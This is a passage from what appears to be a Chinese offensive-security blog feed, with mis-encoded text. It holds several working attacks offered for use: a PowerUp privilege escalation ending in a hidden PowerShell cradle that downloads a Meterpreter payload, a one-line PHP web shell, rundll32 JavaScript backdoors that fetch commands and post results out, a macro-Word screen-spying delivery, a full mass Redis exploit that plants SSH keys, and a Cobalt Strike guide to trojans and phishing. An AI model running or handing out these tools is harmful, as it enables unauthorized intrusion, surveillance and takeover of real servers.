å®æˆ˜ææƒæµ‹è¯•ç¯å¢ƒä¸ºwin10ã€‚å¹³å¸¸ç”¨çš„è™šæ‹Ÿæœºï¼Œå¹¶æ²¡æœ‰ç‰¹æ„å»é…ç½®å­˜åœ¨æ¼æ´çš„ç¯å¢ƒï¼Œæ‰€ä»¥å¹¶ä¸æ˜¯æ‰€æœ‰çš„æ¨¡å—å‡å¯ä»¥ä½¿ç”¨ã€‚å®é™…æµ‹è¯•å¯ä»¥æ ¹æ®å®é™…ç¯å¢ƒæ¥è°ƒæ•´ã€‚æ­¤æ¬¡æµ‹è¯•å¹¶æœªä½¿ç”¨å†…æ ¸æ¼æ´æ¥ææƒã€‚é¦–å…ˆæ·»åŠ ä½æƒé™æµ‹è¯•è´¦å·ï¼Œä½¿ç”¨ç®¡ç†å‘˜èº«ä»½è¿è¡Œcmdï¼Œæ·»åŠ æµ‹è¯•è´¦å·ï¼š1C:\Windows\system32&gt;net user powerup 1 /add æŸ¥çœ‹powerupè´¦å·æƒé™ï¼š ä½¿ç”¨powerupè´¦å·ç™»é™†ç³»ç»Ÿï¼ŒåŠ è½½Powerupï¼š æ‰§è¡ŒInvoke-AllChecks:1PS E:\&gt; Invoke-AllChecks æ‰§è¡Œä»¥åæ‰¾åˆ°ä¸‹åˆ—é—®é¢˜ï¼š1234567891011121314151617181920212223242526[*] Checking for unquoted service paths...ServiceName : CDROM_DetectPath : C:\Program Files\4G USB Modem\4G_Eject.exeStartName : LocalSystemAbuseFunction : Write-ServiceBinary -ServiceName 'CDROM_Detect' -Path &lt;HijackPath&gt;ServiceName : hMailServerPath : C:\Program Files (x86)\hMailServer\Bin\hMailServer.exe RunAsServiceStartName : LocalSystemAbuseFunction : Write-ServiceBinary -ServiceName 'hMailServer' -Path &lt;HijackPath&gt;[*] Checking service executable and argument permissions...ServiceName : wampapachePath : "c:\wamp\bin\apache\apache2.2.17\bin\httpd.exe" -k runserviceModifiableFile : c:\wamp\bin\apache\apache2.2.17\bin\httpd.exeStartName : LocalSystemAbuseFunction : Install-ServiceBinary -ServiceName 'wampapache'ServiceName : wampmysqldPath : c:\wamp\bin\mysql\mysql5.5.8\bin\mysqld.exe wampmysqldModifiableFile : c:\wamp\bin\mysql\mysql5.5.8\bin\mysqld.exeStartName : LocalSystemAbuseFunction : Install-ServiceBinary -ServiceName 'wampmysqld' å¯ä»¥çœ‹å‡ºï¼ŒPowerupåˆ—å‡ºäº†å¯èƒ½å­˜åœ¨é—®é¢˜çš„æœåŠ¡ï¼Œå¹¶åœ¨AbuseFunctionä¸­ç»™äº†æ¥ä¸‹æ¥çš„åˆ©ç”¨æ–¹å¼ã€‚åœ¨ä¸Šé¢ä¸¤ä¸ªåˆ©ç”¨ç‚¹å¯ä»¥çœ‹å‡ºï¼Œunquoted service pathsä¸­ç»™å‡ºäº†ä¸¤ä¸ªè·¯å¾„å¸¦ç©ºæ ¼çš„æ–‡ä»¶è·¯å¾„ï¼Œä½†æ˜¯å› ä¸ºå…¶åœ¨cç›˜ï¼Œæ²¡æœ‰æƒé™ï¼Œæ‰€ä»¥å¹¶ä¸èƒ½è¢«æˆ‘ä»¬åˆ©ç”¨æ¥ææƒã€‚è€Œç¬¬äºŒä¸ªæ£€æŸ¥é€šè¿‡Get-ServiceFilePermissionæ‰¾åˆ°ä¸¤ä¸ªå½“å‰ç”¨æˆ·å¯ä»¥å†™å…¥ç›¸å…³è”å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ¥è¿›è¡Œææƒã€‚åœ¨AbuseFunctioné‚£é‡Œå·²ç»ç»™äº†æˆ‘ä»¬æ“ä½œæ–¹å¼ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬æ‰§è¡Œå¦‚ä¸‹æ“ä½œï¼š1PS E:\&gt; Install-ServiceBinary -ServiceName 'wampapache' -UserName rockyou -Password 123 ä¹‹åå½“ç®¡ç†å‘˜è¿è¡Œè¯¥æœåŠ¡çš„æ—¶å€™ï¼Œåˆ™ä¼šæ·»åŠ æˆ‘ä»¬çš„è´¦å·ï¼Œè¿è¡Œå‰ï¼š è¿è¡ŒæœåŠ¡ä»¥åï¼š æŸ¥çœ‹è¯¥è´¦å·æƒé™ï¼š å½“ç„¶ï¼Œé™¤äº†æ·»åŠ è´¦å·ï¼Œæˆ‘ä»¬åŒæ ·å¯ä½¿ç”¨msfè·å¾—meterpreterä¼šè¯ã€‚ä½¿ç”¨web_delivery æ¨¡å—å¼€å¯ç›‘å¬ï¼š12345678910111213msf &gt; use exploit/multi/script/web_delivery msf exploit(web_delivery) &gt; set URIPATH /URIPATH =&gt; /msf exploit(web_delivery) &gt; set lport 8888lport =&gt; 8888msf exploit(web_delivery) &gt; set target 2target =&gt; 2msf exploit(web_delivery) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(web_delivery) &gt; set SRVPORT 8080SRVPORT =&gt; 8080msf exploit(web_delivery) &gt; set LHOST 192.168.74.1 msf exploit(web_delivery) &gt; exploit æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š1PS E:\&gt; Install-ServiceBinary -ServiceName 'wampapache' -Command "powershell.exe -nop -w hidden -c `$m=new-object net.webclient;`$m.proxy=[Net.WebRequest]::GetSystemWebProxy();`$m.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX `$m.downloadstring('http://192.168.74.1:8080/');" è¦æ³¨æ„ $ ç¬¦å·å‰é¢è¦åŠ  ` æ¥è½¬ä¹‰ å½“ç®¡ç†å‘˜è¿è¡Œæ­¤æœåŠ¡ä»¥ååˆ™è·å–é«˜æƒé™çš„meterpreterä¼šè¯ ææƒä»¥åï¼Œä½¿ç”¨Restore-ServiceBinary æ¢å¤æ–‡ä»¶ï¼š1PS E:\&gt; Restore-ServiceBinary -ServiceName 'wampapache' å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ä½¿ç”¨powerupæˆåŠŸææƒäº†ã€‚å½“ç„¶ç¢°åˆ°å®é™…çš„ç¯å¢ƒå¯ä»¥æ ¹æ®ä¸åŒç¯å¢ƒä¸åŒæ–¹å¼æ¥è¿›è¡Œææƒã€‚ 0x04 å°ç»“Powerupæä¾›äº†ä¸€äº›æˆ‘ä»¬å¹¶ä¸å¸¸è§çš„ææƒæ–¹å¼ï¼Œå¹¶ä¸”ä¸ºæˆ‘ä»¬çš„Windowsææƒæä¾›äº†æå¤§çš„æ–¹ä¾¿ï¼Œå¦‚æœç¢°åˆ°æœªå®‰è£…Powershellçš„è®¡ç®—æœºï¼Œå¯ä»¥è¯¦ç»†å‚è€ƒPowerupé‡Œé¢çš„å‡½æ•°å®ç°è¿‡ç¨‹æ¥é€šè¿‡åˆ«çš„æ–¹å¼æ¥å®ç°åŒæ ·çš„æ•ˆæœï¼Œå¸Œæœ›æœ¬æ–‡å¯¹ä½ æœ‰å¸®åŠ©ã€‚]]></content>
      <categories>
        <category>æ¸—é€æ¡ˆä¾‹</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
        <tag>powerup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æœ€çŸ­phpä¸€å¥è¯]]></title>
    <url>%2Farchives%2Fphpcodes.html</url>
    <content type="text"><![CDATA[1&lt;?=`$_GET[1]`; è¯¦ç»†ï¼šhttp://drops.wooyun.org/papers/11718]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[JSbackdoor]]></title>
    <url>%2Farchives%2F121.html</url>
    <content type="text"><![CDATA[//Execute A Command1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("calc"); //Write To A File1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";fso=new%20ActiveXObject("Scripting.FileSystemObject");a=fso.CreateTextFile("c:\\Temp\\testfile.txt",true);a.WriteLine("Test");a.Close();self.close; //Read and Execute From A File1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();fso=new%20ActiveXObject("Scripting.FileSystemObject");f=fso.OpenTextFile("c:\\Temp\\testfile.txt",1);eval((f.ReadAll())); //Map A Remote Share (WEBDAV)1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";n=new%20ActiveXObject('WScript.Network');n.MapNetworkDrive("S:","https://live.sysinternals.com");self.close; //Map A Local Share1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";n=new%20ActiveXObject('WScript.Network');n.MapNetworkDrive("S:","\\\\Localhost\\c$");self.close; //Read and Execute Commands From A File1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();fso=new%20ActiveXObject("Scripting.FileSystemObject");f=fso.OpenTextFile("c:\\Temp\\Commands.txt",1);while(!f.AtEndOfStream)&#123;t=new%20ActiveXObject("WScript.Shell");t.Run("cmd%20/c%20"%20+%20f.ReadLine(),null,true);&#125;; //Retrieve Commands From HTTP1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1/a.txt",false);h.Send();B=h.ResponseText;alert(B); //POST results back to Server1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("POST","http://127.0.0.1:8081/a.php",false);h.Send("Stuff");]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>backdoor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Use Powershell Stream a target's Desktop]]></title>
    <url>%2Farchives%2FUse_Powershell_Stream_A_Target-t_Desktop.html</url>
    <content type="text"><![CDATA[æœ€è¿‘Ninshangçš„ä½œè€…åˆå‡ºäº†ä¸€ä¸ªæ–°çš„è„šæœ¬ï¼Œèƒ½å¤Ÿé€šè¿‡powershellå¯¹ç›®æ ‡çš„å±å¹•è¿›è¡Œå®æ—¶ç›‘æ§ã€‚è„šæœ¬åœ°å€å¦‚ä¸‹ï¼šShow-TargetScreen.ps1 ä½¿ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œè„šæœ¬åŒ…æ‹¬äº†reverseä»¥åŠbindæ¨¡å¼ã€‚ä¸‹é¢æ˜¯ä½¿ç”¨ç¤ºä¾‹ï¼š 0x01 Bindæ¨¡å¼ï¼š12PS C:\Users\evi1cg\Desktop&gt; . .\Show-TargetScreen.ps1PS C:\Users\evi1cg\Desktop&gt; Show-TargetScreen -Bind -Port 3333 ç„¶ååœ¨è‡ªå·±çš„è®¡ç®—æœºä¸Šä½¿ç”¨ç«ç‹è®¿é—®ç›®æ ‡3333ç«¯å£ï¼Œç»“æœå¦‚ä¸‹å›¾ï¼š 0x02 Reverseæ¨¡å¼attackerï¼šåœ¨è¿™é‡Œå¯ä»¥ä½¿ç”¨åˆ›å®‡çš„pyè„šæœ¬è½¬å‘ï¼šrtcpæ‰§è¡Œ:1â˜ rtcp [master] python rtcp.py l:5555 l:4444 ç›‘å¬æœ¬åœ°5555ç«¯å£ä»¥åŠ4444ç«¯å£ã€‚ ä¹‹ååœ¨targetæ‰§è¡Œï¼š12PS C:\Users\evi1cg\Desktop&gt; . .\Show-TargetScreen.ps1PS C:\Users\evi1cg\Desktop&gt; Show-TargetScreen -Reverse -IPAddress 192.168.74.1 -Port 5555 æ•ˆæœæˆªå›¾ï¼š 0x03 ä½¿ç”¨Powershell Clientä¹‹å‰åœ¨ä¹Œäº‘å‘è¿‡ä½¿ç”¨powershell Clientè¿›è¡Œæœ‰æ•ˆé’“é±¼,åœ¨è¿™é‡Œä¹Ÿæ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œè¿™é‡Œä»¥Out-Word.ps1ä½œä¸ºæ¼”ç¤ºç¤ºä¾‹ï¼š ç”Ÿæˆwordæ–‡ä»¶:123PS C:\Users\evi1cg\Desktop&gt; . .\Out-Word.ps1PS C:\Users\evi1cg\Desktop&gt; Out-Word -PayloadURL "http://192.168.74.1/Show-TargetScreen.ps1" -Arguments "Show-TargetScreen -Reverse -IPAddress 192.168.74.1 -Port 6666" ä¹‹åå°†Show-TargetScreen.ps1æ”¾åœ¨æˆ‘ä»¬çš„webæ ¹ç›®å½•ï¼šæµ‹è¯•ï¼š å¼€å¯ç›‘å¬ï¼š1â˜ rtcp [master] python rtcp.py l:6666 l:4444 å½“è¿è¡Œå¼€å¯officeå®çš„wordæ—¶ï¼Œæˆ‘ä»¬å°±å¯å¯¹å…¶å±å¹•è¿›è¡Œç›‘æ§ï¼Œå¦‚ä¸‹å›¾ï¼š]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>Powershell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[13ç§æ–¹å¼ä¸‹è½½æ–‡ä»¶]]></title>
    <url>%2Farchives%2F13-ways-to-download-a-file.html</url>
    <content type="text"><![CDATA[æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­å¸¸å¸¸é‡åˆ°éœ€è¦å°†æ–‡ä»¶ä¸‹è½½åˆ°å—å®³è€…æœåŠ¡å™¨ä¸Šï¼Œè¿™é‡Œä»‹ç»15ç§ä¸‹è½½æ–‡ä»¶çš„æ–¹å¼ï¼Œå¸Œæœ›èƒ½å¸®åŠ©åˆ°ä½ ã€‚ 0x01 Powershellåˆ›å»ºå¦‚ä¸‹PSHè„šæœ¬ï¼š12$p = New-Object System.Net.WebClient $p.DownloadFile("http://domain/file","C:%homepath%file") æ‰§è¡Œï¼š1PS C:&gt; .test.ps1 å¦‚æœPowershellç¦æ­¢æ‰§è¡Œäº†ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š1C:&gt;powershell set-executionpolicy unrestricted 0x02 Visual Basicåˆ›å»ºå¦‚ä¸‹VBSè„šæœ¬ã€‚123456789101112Set args = Wscript.ArgumentsUrl = "http://domain/file"dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")dim bStrm: Set bStrm = createobject("Adodb.Stream")xHttp.Open "GET", Url, FalsexHttp.Sendwith bStrm .type = 1 ' .open .write xHttp.responseBody .savetofile " C:\%homepath%\file", 2 'end with æ‰§è¡Œï¼š1C:&gt;cscript test.vbs 0x03 Perlè„šæœ¬å¦‚ä¸‹:123#!/usr/bin/perl use LWP::Simple; getstore("http://domain/file", "file"); æ‰§è¡Œï¼š1root@kali:~# perl test.pl 0x04 Pythonè„šæœ¬å¦‚ä¸‹ï¼š123456#!/usr/bin/python import urllib2 u = urllib2.urlopen('http://domain/file') localFile = open('local_file', 'w') localFile.write(u.read()) localFile.close() æ‰§è¡Œï¼š1root@kali:~# python test.py 0x05 Rubyè„šæœ¬å¦‚ä¸‹ï¼š12345678#!/usr/bin/rubyrequire 'net/http'Net::HTTP.start("www.domain.com") &#123; |http|r = http.get("/file")open("save_location", "wb") &#123; |file|file.write(r.body)&#125;&#125; æ‰§è¡Œï¼š1root@kali:~# ruby test.rb 0x06 PHPè„šæœ¬å¦‚ä¸‹ï¼š1234567#!/usr/bin/php &lt;?php $data = @file("http://example.com/file");$lf = "local_file"; $fh = fopen($lf, 'w'); fwrite($fh, $data[0]); fclose($fh); ?&gt; æ‰§è¡Œï¼š1root@kali:~# php test.php 0x07 FTPæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š1ftp 127.0.0.1 username password get file exit 0x08 TFTPæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š1tftp -i host GET C:%homepath%file location_of_file_on_tftp_server 0x09 Bitsadminæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š1bitsadmin /transfer n http://domain/file c:%homepath%file 0x10 Wgetæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š1wget http://example.com/file 0x11 Netcatattackeræ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š1cat file | nc -l 1234 targetæ‰§è¡Œï¼š1nc host_ip 1234 &gt; file 0x12 Window æ–‡ä»¶å…±äº«ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤:1net use x: \127.0.0.1\share /user:example.comuserID myPassword 0x13 è®°äº‹æœ¬ï¼š æ‰“å¼€è®°äº‹æœ¬ æ–‡ä»¶ï¼Œæ‰“å¼€ åœ¨æ–‡ä»¶åå¤„å¡«å…¥ä¸‹è½½åœ°å€]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
      <tags>
        <tag>download</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redisæœªæˆæƒæ‰¹é‡ææƒè„šæœ¬(python)]]></title>
    <url>%2Farchives%2Fhackredis.html</url>
    <content type="text"><![CDATA[å®‰è£…ä¾èµ–1â˜ ~ sudo easy_install redis ä½¿ç”¨12345678910111213â˜ redis python hackredis.py usage: hackredis.py [-h] [-l IPLIST] [-p PORT] [-r ID_RSAFILE] [-sp SSH_PORT]For Example:-----------------------------------------------------------------------------python hackredis.py -l ip.txt -p 6379 -r foo.txt -sp 22optional arguments: -h, --help show this help message and exit -l IPLIST the hosts of target -p PORT the redis default port -r ID_RSAFILE the ssh id_rsa file you generate -sp SSH_PORT the ssh port é¦–å…ˆéœ€è¦sshå¯†é’¥:12â˜ ~ ssh-keygen -t rsaâ˜ ~ cp ~/.ssh/id_rsa.pub /tmp/foo.txt ä¹‹åå°†ipåˆ—è¡¨å¡«å…¥ip.txtï¼Œç„¶åå°±å¯ä»¥è·‘äº†ã€‚ æˆåŠŸçš„å°†ä¼šè¾“å‡ºåˆ°success.txt,æ‰§è¡ŒæˆåŠŸä½†æ˜¯sshè¿æ¥å¤±è´¥çš„ä¼šå­˜å‚¨åœ¨unconnect.txtï¼Œæ“ä½œå¤±è´¥çš„ä¼šå­˜å‚¨åœ¨fail.txtã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#!/usr/bin/python#coding:utf-8############################################################### @file hackredis.py #### @date 2015-12-11 #### @author evi1cg ###############################################################import redisimport argparseimport textwrapimport sysimport pexpectdef getargs(): parser = argparse.ArgumentParser(prog='hackredis.py', formatter_class=argparse.RawTextHelpFormatter, description=textwrap.dedent('''\ For Example: ----------------------------------------------------------------------------- python hackredis.py -l ip.txt -p 6379 -r foo.txt -sp 22''')) parser.add_argument('-l', dest='iplist', type=str, help='the hosts of target') parser.add_argument('-p', dest='port', default=6379, type=int, help='the redis default port') parser.add_argument('-r', dest='id_rsafile', type=str, help='the ssh id_rsa file you generate') parser.add_argument('-sp', dest='ssh_port', type=int,default=22, help='the ssh port') if(len(sys.argv[1:]) / 2 != 4): sys.argv.append('-h') return parser.parse_args()def hackredis(host,port): ck = 0 try: print "[*] Attacking ip:%s"%host r =redis.StrictRedis(host=host,port=port,db=0,socket_timeout=2) r.flushall r.set('crackit',foo) r.config_set('dir','/root/.ssh/') r.config_set('dbfilename','authorized_keys') r.save() ck =1 except: print "\033[1;31;40m[-]\033[0m Something wrong with %s"%host write(host,2) ck =0 if ck == 1: check(host) else: passdef check(host): print '\033[1;33;40m[*]\033[0m Check connecting... ' try: ssh = pexpect.spawn('ssh root@%s -p %d' %(host,ssh_port)) i = ssh.expect('[#\$]',timeout=2) if i == 0: print "\033[1;34;40m[+]\033[0m Success !" write(host,1) else: pass except: print "\033[1;32;40m[-]\033[0m Failed to connect !" write(host,3)def write(host,suc): if suc == 1: filesname = 'success.txt' elif suc ==2: filesname = 'fail.txt' elif suc ==3: filesname = 'unconnect.txt' else: pass file_object = open(filesname,'a') file_object.write(host+'\n') file_object.close()def main(): global foo,ssh_port paramsargs = getargs() try: hosts = open(paramsargs.iplist,"r") except(IOError): print "Error: Check your hostfile path\n" sys.exit(1) port = paramsargs.port ssh_port = paramsargs.ssh_port try: foo = '\n\n\n'+open(paramsargs.id_rsafile,"r").readline()+'\n\n\n' except(IOError): print "Error: Check your wordlist path\n" sys.exit(1) ips = [p.replace('\n','') for p in hosts] for ip in ips: hackredis(ip.strip(),port)if __name__ == "__main__": main()]]></content>
      <categories>
        <category>å·¥å…·æ”¶é›†</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cobalt strike3.0ä½¿ç”¨æ‰‹å†Œ]]></title>
    <url>%2Farchives%2FCobalt_strike.html</url>
    <content type="text"><![CDATA[Cobalt strike3.0ä½¿ç”¨æ‰‹å†Œ 0x00 ç®€ä»‹Cobalt Strike ä¸€æ¬¾ä»¥metasploitä¸ºåŸºç¡€çš„GUIçš„æ¡†æ¶å¼æ¸—é€å·¥å…·ï¼Œé›†æˆäº†ç«¯å£è½¬å‘ã€æœåŠ¡æ‰«æï¼Œè‡ªåŠ¨åŒ–æº¢å‡ºï¼Œå¤šæ¨¡å¼ç«¯å£ç›‘å¬ï¼Œwin exeæœ¨é©¬ç”Ÿæˆï¼Œwin dllæœ¨é©¬ç”Ÿæˆï¼Œjavaæœ¨é©¬ç”Ÿæˆï¼Œofficeå®ç—…æ¯’ç”Ÿæˆï¼Œæœ¨é©¬æ†ç»‘ï¼›é’“é±¼æ”»å‡»åŒ…æ‹¬ï¼šç«™ç‚¹å…‹éš†ï¼Œç›®æ ‡ä¿¡æ¯è·å–ï¼Œjavaæ‰§è¡Œï¼Œæµè§ˆå™¨è‡ªåŠ¨æ”»å‡»ç­‰ç­‰ã€‚è€ŒCobalt Strike 3.0å·²ç»ä¸å†ä½¿ç”¨Metasploitæ¡†æ¶è€Œä½œä¸ºä¸€ä¸ªç‹¬ç«‹çš„å¹³å°ä½¿ç”¨ï¼Œå½“ç„¶å¯ä»¥ç»“åˆArmitageè¿›è¡Œä½¿ç”¨ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªç ´è§£ç‰ˆï¼š ä¸‹è½½åœ°å€ï¼šæˆ³æˆ‘(è‡ªè¡ŒéªŒè¯å…¶å®‰å…¨æ€§) Cobalt Strike 3.0 å»¶ç”¨äº†å…¶å¼ºå¤§çš„å›¢ä½“æœåŠ¡å™¨åŠŸèƒ½ï¼Œèƒ½è®©å¤šä¸ªæ”»å‡»è€…åŒæ—¶è¿æ¥åˆ°å›¢ä½“æœåŠ¡å™¨ä¸Šï¼Œå…±äº«æ”»å‡»èµ„æºä¸ç›®æ ‡ä¿¡æ¯å’Œsessionsã€‚å½“ç„¶ï¼Œåœ¨ä½¿ç”¨Cobalt Strikeä¹‹å‰ï¼Œéœ€è¦å®‰è£…javaç¯å¢ƒï¼Œå…·ä½“æ€ä¹ˆé…ç½®ï¼Œè¯·ç§»æ­¥javaç¯å¢ƒæ­å»ºã€‚ 0x01 è¿è¡Œä¸ä¹‹å‰ç‰ˆæœ¬çš„ Cobalt Strikeä¸åŒï¼Œ Cobalt Strike3.0éœ€è¦å¼€å¯å›¢ä½“æœåŠ¡å™¨æ‰å¯ä»¥é“¾æ¥ä½¿ç”¨ï¼Œå½“ç„¶ï¼Œè¿™ä¸ªæœåŠ¡å™¨å¯ä»¥æ”¾åˆ°å…¬ç½‘ç¯å¢ƒä¸‹ï¼Œæˆ–è€…æ”¾åˆ°è‡ªå·±æƒ³è¦æ­å»ºæ­¤æœåŠ¡çš„ç¯å¢ƒä¸­ã€‚ä¸‹è½½å¥½Cobalt Strikeä»¥ååŒ…å«ä»¥ä¸‹å‡ ä¸ªæ–‡ä»¶ï¼š å…¶ä¸­å…³é”®çš„æ–‡ä»¶æ˜¯teamserverä»¥åŠcobaltstrike.jarï¼Œå°†è¿™ä¸¤ä¸ªæ–‡ä»¶æ”¾åˆ°æœåŠ¡å™¨ä¸ŠåŒä¸€ä¸ªç›®å½•ï¼Œç„¶åè¿è¡Œï¼š1â˜ cobaltstrike sudo ./teamserver 192.168.74.1 msf3 è¿™é‡Œä¸ºäº†æ–¹ä¾¿ä½¿ç”¨ï¼Œæœ€å¥½ä½¿ç”¨å…·ä½“çš„ipåœ°å€ï¼Œè€Œä¸æ˜¯0.0.0.0æˆ–è€…127.0.0.1, å¦‚æœæœ‰å¤šä¸ªç½‘å¡ï¼Œä½¿ç”¨ä½ è¦ç”¨çš„é‚£ä¸ªipåœ°å€å³å¯ï¼Œmsf3 ä¸ºè¯¥å›¢ä½“æœåŠ¡å™¨çš„è¿æ¥å¯†ç ã€‚ æœåŠ¡è¿è¡Œä»¥åï¼Œåœ¨å®¢æˆ·ç«¯è¿›è¡Œè¿æ¥ï¼š1â˜ cobaltstrike java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar $* è¿™é‡Œipä½¿ç”¨æœåŠ¡å™¨çš„ipï¼Œç«¯å£é»˜è®¤50050ï¼Œç”¨æˆ·åéšæ„ï¼Œå¯†ç ä¸ºä¹‹å‰è®¾ç½®çš„å¯†ç ï¼Œç„¶åconnect,å¼¹å‡ºéªŒè¯çª—å£ï¼Œç„¶åç‚¹æ˜¯ï¼Œå°±è¿›å…¥Cobalt Strikeäº†ã€‚ 0x02 Listenersä½¿ç”¨Cobalt Strikeé¦–å…ˆéœ€è¦åˆ›å»ºä¸€ä¸ªListener,ä¾æ¬¡ç‚¹å‡» Cobalt Strike-&gt;Listeners ï¼Œç„¶åç‚¹å‡»Addä¾¿å¯ä»¥åˆ›å»ºè‡ªå·±æƒ³è¦çš„Listenersäº†ï¼ŒCobalt Strike3.0åŒ…æ‹¬ windows/beacon_dns/reverse_dns_txt windows/beacon_dns/reverse_http windows/beacon_http/reverse_http windows/beacon_https/reverse_https windows/beacon_smb/bind_pipe windows/foreign/reverse_dns_txt windows/foreign/reverse_http windows/foreign/reverse_https windows/foreign/reverse_tcp å…¶ä¸­windows/beacon æ˜¯Cobalt Strikeè‡ªå¸¦çš„æ¨¡å—ï¼ŒåŒ…æ‹¬dns,http,https,smbå››ç§æ–¹å¼çš„ç›‘å¬å™¨ï¼Œwindows/foreign ä¸ºå¤–éƒ¨ç›‘å¬å™¨ï¼Œå³msfæˆ–è€…Armitageçš„ç›‘å¬å™¨ã€‚é€‰æ‹©ç›‘å¬å™¨ä»¥åï¼Œhostä¼šè‡ªåŠ¨å¡«å†™æˆ‘ä»¬å¼€å¯æœåŠ¡æ—¶çš„ipï¼Œé…ç½®ç›‘å¬ç«¯å£ï¼Œç„¶åä¿å­˜ï¼Œç›‘å¬å™¨å°±åˆ›å»ºå¥½äº†ã€‚ 0x03 Attacksåˆ›å»ºå¥½ç›‘å¬å™¨ï¼Œä¸‹é¢å°±éœ€è¦é…ç½®å®¢æˆ·ç«¯äº†ï¼ŒCobalt StrikeåŒ…æ‹¬å¤šç§æ”»å‡»æ–¹å¼ï¼Œå…¶ä¸­PackagesåŒ…æ‹¬å¦‚ä¸‹å‡ ç§ï¼š HTML Application ç”Ÿæˆæ¶æ„çš„HTAæœ¨é©¬æ–‡ä»¶ï¼›MS Office Macro ç”Ÿæˆofficeå®ç—…æ¯’æ–‡ä»¶ï¼›Payload Generator ç”Ÿæˆå„ç§è¯­è¨€ç‰ˆæœ¬çš„payload;USB/CD AutoPlay ç”Ÿæˆåˆ©ç”¨è‡ªåŠ¨æ’­æ”¾è¿è¡Œçš„æœ¨é©¬æ–‡ä»¶ï¼›Windows Dropper æ†ç»‘å™¨ï¼Œèƒ½å¤Ÿå¯¹æ–‡æ¡£ç±»è¿›è¡Œæ†ç»‘ï¼›Windows Executable ç”Ÿæˆå¯æ‰§è¡Œexeæœ¨é©¬ï¼›Windows Executable(S)ç”Ÿæˆæ— çŠ¶æ€çš„å¯æ‰§è¡Œexeæœ¨é©¬ã€‚ Web Drive-byï¼ˆé’“é±¼æ”»å‡»ï¼‰åŒ…æ‹¬å¦‚ä¸‹å‡ ä¸ªæ¨¡å—ï¼š Manageå¯¹å¼€å¯çš„webæœåŠ¡è¿›è¡Œç®¡ç†ï¼›Clone Site å…‹éš†ç½‘ç«™ï¼Œå¯ä»¥è®°å½•å—å®³è€…æäº¤çš„æ•°æ®ï¼›Host File æä¾›ä¸€ä¸ªæ–‡ä»¶ä¸‹è½½ï¼Œå¯ä»¥ä¿®æ”¹Mimeä¿¡æ¯ï¼›PowerShell Web Deliveryç±»ä¼¼äºmsf çš„web_delivery ;Signed Applet Attack ä½¿ç”¨javaè‡ªç­¾åçš„ç¨‹åºè¿›è¡Œé’“é±¼æ”»å‡»;Smart Applet Attack è‡ªåŠ¨æ£€æµ‹javaç‰ˆæœ¬å¹¶è¿›è¡Œæ”»å‡»ï¼Œé’ˆå¯¹Java 1.6.0_45ä»¥ä¸‹ä»¥åŠJava 1.7.0_21ä»¥ä¸‹ç‰ˆæœ¬ï¼›System Profilerç”¨æ¥è·å–ä¸€äº›ç³»ç»Ÿä¿¡æ¯ï¼Œæ¯”å¦‚ç³»ç»Ÿç‰ˆæœ¬ï¼ŒFlashç‰ˆæœ¬ï¼Œæµè§ˆå™¨ç‰ˆæœ¬ç­‰ã€‚ Spear Phish æ˜¯ç”¨æ¥é‚®ä»¶é’“é±¼çš„æ¨¡å—ã€‚ 0x04 View Viewæ¨¡å—å¯ä»¥æ–¹ä¾¿æµ‹è¯•è€…æŸ¥çœ‹å„ä¸ªæ¨¡å—ï¼Œå›¾å½¢åŒ–çš„ç•Œé¢å¯ä»¥æ–¹ä¾¿çš„çœ‹åˆ°å—å®³è€…æœºå™¨çš„å„ä¸ªä¿¡æ¯ã€‚ 